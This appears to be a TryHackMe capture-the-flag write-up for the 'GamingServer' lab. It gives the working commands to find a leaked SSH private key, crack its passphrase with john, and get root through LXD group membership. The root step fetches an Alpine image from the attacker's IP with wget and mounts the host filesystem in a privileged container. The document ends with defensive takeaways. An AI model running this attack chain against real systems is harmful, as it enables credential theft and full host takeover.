# 🎮 GamingServer: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `gaming.thm` |
| **OS** | Ubuntu 18.04 |
| **Attack Surface** | Exposed SSH private key + username leak in HTML comment |
| **Privesc** | LXD group membership → privileged container + host bind mount → root |

GamingServer leaks an SSH private key via a publicly accessible `/secret/` directory, and drops the target username in an HTML comment. The private key passphrase is cracked with `john`. Once in as `john`, LXD group membership allows spinning up a privileged Alpine container with the host filesystem bind-mounted — the classic LXD privesc.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 gaming.thm -oA gaming-tcp-scan
```

```
22/tcp open  ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http   Apache httpd 2.4.29 (Ubuntu)
```

### Directory Bruteforce

```bash
gobuster dir -u http://gaming.thm -w ./raft-medium-directories.txt
```

```
/uploads    (Status: 301)
/secret     (Status: 301)  ← SSH private key here
```

### Username Leak

Page source of `index.html`:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Username: `john`.

### SSH Key Retrieval

```bash
curl http://gaming.thm/secret/secretKey
```

Returns a passphrase-encrypted RSA private key.

---

## 💀 Initial Access — SSH with Cracked Private Key

### Crack Passphrase

```bash
ssh2john secretKey > secretKey.hash
john --wordlist=./dict.lst secretKey.hash
# letmein    (./secretKey)
```

### Strip Passphrase and Login

```bash
ssh-keygen -p -N "" -f ./secretKey
ssh -i secretKey john@gaming.thm
```

```
john@exploitable:~$
```

---

## 🔁 Privilege Escalation — john → root

### LXD Group

```bash
id
# uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

`john` is in the `lxd` group. LXD group membership is equivalent to root — members can spin up privileged containers with unrestricted host filesystem access.

### Build and Import Alpine Image

Built the Alpine image on the attacker machine using [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder), transferred to target:

```bash
# On attacker
sudo bash build-alpine
python3 -m http.server 8080

# On target
wget http://10.14.102.34/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

### Mount Host Filesystem via Privileged Container

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

```
~ # cat /mnt/root/root/root.txt
```

The entire host filesystem is accessible under `/mnt/root` as root inside the container.

---

## 🗺️ Attack Chain

```
[HTML Comment]
    Username: john
          │
          ▼
[/secret/secretKey]
    RSA private key → passphrase cracked (letmein) → SSH as john
          │
          ▼
[LXD Group]
    Alpine image import → privileged container
    Host bind mount → /mnt/root/root/root.txt → root
```

---

## 📌 Key Takeaways

- Private keys in web-accessible directories are a critical exposure; serve only static content from webroot and never place credentials there
- HTML comments are visible in page source — never leak usernames, internal notes, or infrastructure hints in client-side code
- LXD/LXC group membership is a root equivalent; treat it identically to `sudo ALL` and restrict it accordingly
- Passphrase-protected SSH keys only slow down an attacker if the passphrase is strong; `letmein` falls in seconds against any common wordlist

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083) |
| Credential Access | Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004) |
| Privilege Escalation | Escape to Host | [T1611](https://attack.mitre.org/techniques/T1611) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `gobuster` | Directory bruteforce to find /secret/ |
| `ssh2john` | Extract hash from passphrase-protected SSH key |
| `john` | Crack SSH key passphrase |
| `ssh-keygen` | Strip passphrase from private key |
| `ssh` | Login as john with cracked private key |
| `lxc` | Privileged Alpine container with host bind mount for root |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
